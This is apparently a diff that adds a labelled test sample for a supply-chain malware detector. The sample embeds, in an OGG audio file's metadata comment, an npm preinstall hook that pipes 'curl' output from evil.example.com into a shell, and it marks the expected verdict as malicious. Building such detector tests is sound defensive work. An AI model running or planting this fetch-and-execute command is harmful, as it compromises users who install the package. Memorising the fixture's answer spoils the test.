@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::102::binary-variations::1",
+  "base_sample_id": "exp::supply-chain-detector::102",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -928294314,
+  "content": "{\n  \"format\": \"ogg\",\n  \"vorbisComment\": {\n    \"vendor\": \"Lavf60.3.100\",\n    \"comments\": [\n      \"TITLE={\\\"scripts\\\": {\\\"preinstall\\\": \\\"curl -s https://evil.example.com/payload.sh | sh\\\"}}\\n\",\n      \"ENCODER=libvorbis\"\n    ]\n  }\n}",
+  "content_hash": "0ca9a5fd786296266ac9ce21b547db87f9ee0e03751e26132f1e4cdc9fa11cd1",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:ogg-comment",
+  "difficulty": "advanced"
+}
